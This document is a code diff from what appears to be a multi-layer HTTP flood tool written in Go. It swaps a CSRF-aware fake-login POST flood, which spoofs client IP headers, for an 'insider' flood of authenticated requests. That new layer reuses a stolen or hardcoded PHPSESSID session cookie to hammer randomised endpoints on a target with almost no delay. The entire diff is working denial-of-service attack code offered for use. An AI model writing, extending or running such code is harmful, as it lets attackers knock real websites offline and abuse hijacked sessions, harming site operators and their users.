@@ -28,7 +28,7 @@ func fetchCSRFToken(client *http.Client, loginURL string) (string, error) {
 
 	matches := csrfTokenRegex.FindStringSubmatch(string(body))
 	if len(matches) < 2 {
-		return "", fmt.Errorf("CSRF token 'etkk' not found on login page")
+		return "", fmt.Errorf("CSRF token not found")
 	}
 	return matches[1], nil
 }
@@ -169,15 +169,18 @@ func layer2Recursive(ctx context.Context, o *Orchestrator, workerID int) error {
 }
 
 // ============================================================
-// LAYER 3: CSRF-AWARE FAKE LOGIN POST (HIGH SPEED)
+// LAYER 3: INSIDER DATABASE FLOOD (AUTHENTICATED)
 // ============================================================
-func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error {
-	client := o.proxyMgr.NewClientWithTimeout(15 * time.Second)
-	targetURL := o.smartPaths.LoginPOST
-	refererURL := o.smartPaths.LoginGET
-	loginURL := o.smartPaths.LoginGET
-	csrfEnabled := o.smartPaths.CSRFEnabled
+func layer3InsiderFlood(ctx context.Context, o *Orchestrator, workerID int) error {
+	client := o.proxyMgr.NewClientWithTimeout(30 * time.Second)
+	baseURL := strings.TrimRight(o.target.String(), "/")
 	layerIdx := 2
+
+	// Use dynamic SessionID from SmartPaths, fallback to hardcoded
+	sessionID := o.smartPaths.SessionID
+	if sessionID == "" {
+		sessionID = FallbackSessionID
+	}
 
 	for {
 		select {
@@ -186,45 +189,21 @@ func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error
 		default:
 		}
 
-		var csrfToken string
-		if csrfEnabled {
-			token, err := fetchCSRFToken(client, loginURL)
-			if err != nil {
-				o.stats.FailedRequests.Add(1)
-				o.stats.Layers[layerIdx].Fail.Add(1)
-				continue
-			}
-			csrfToken = token
-		}
+		endpointTemplate := InsiderEndpoints[rand.Intn(len(InsiderEndpoints))]
+		endpoint := fmt.Sprintf(endpointTemplate, time.Now().UnixMilli())
 
-		var body string
-		if csrfToken != "" {
-			body = fmt.Sprintf("etkk=%s&username=%s&password=%s&capt=%d",
-				csrfToken,
-				randomString(8+rand.Intn(16)),
-				randomString(8+rand.Intn(16)),
-				rand.Intn(20)+1)
-		} else {
-			body = fmt.Sprintf("username=%s&password=%s&capt=%d",
-				randomString(8+rand.Intn(16)),
-				randomString(8+rand.Intn(16)),
-				rand.Intn(20)+1)
-		}
-
-		req, err := http.NewRequestWithContext(ctx, "POST", targetURL, strings.NewReader(body))
+		req, err := http.NewRequestWithContext(ctx, "GET", baseURL+endpoint, nil)
 		if err != nil {
 			o.stats.FailedRequests.Add(1)
 			o.stats.Layers[layerIdx].Fail.Add(1)
 			continue
 		}
 
-		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 		req.Header.Set("User-Agent", randomUA())
-		req.Header.Set("Cache-Control", "no-cache")
-		req.Header.Set("Origin", o.target.Scheme+"://"+o.target.Host)
-		req.Header.Set("Referer", refererURL)
-		req.Header.Set("X-Forwarded-For", randomIP())
-		req.Header.Set("X-Real-IP", randomIP())
+		req.Header.Set("Accept", "application/json, text/javascript, */*; q=0.01")
+		req.Header.Set("X-Requested-With", "XMLHttpRequest")
+		req.Header.Set("Referer", baseURL+"/agent/SMSTestPanel")
+		req.Header.Set("Cookie", "PHPSESSID="+sessionID)
 
 		resp, err := client.Do(req)
 		o.stats.TotalRequests.Add(1)
@@ -237,8 +216,16 @@ func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error
 		}
 		io.Copy(io.Discard, resp.Body)
 		resp.Body.Close()
-		o.stats.SuccessRequests.Add(1)
-		o.stats.Layers[layerIdx].Success.Add(1)
+
+		if resp.StatusCode == 200 {
+			o.stats.SuccessRequests.Add(1)
+			o.stats.Layers[layerIdx].Success.Add(1)
+		} else {
+			o.stats.FailedRequests.Add(1)
+			o.stats.Layers[layerIdx].Fail.Add(1)
+		}
+
+		time.Sleep(time.Duration(rand.Intn(10)) * time.Millisecond)
 	}
 }
 
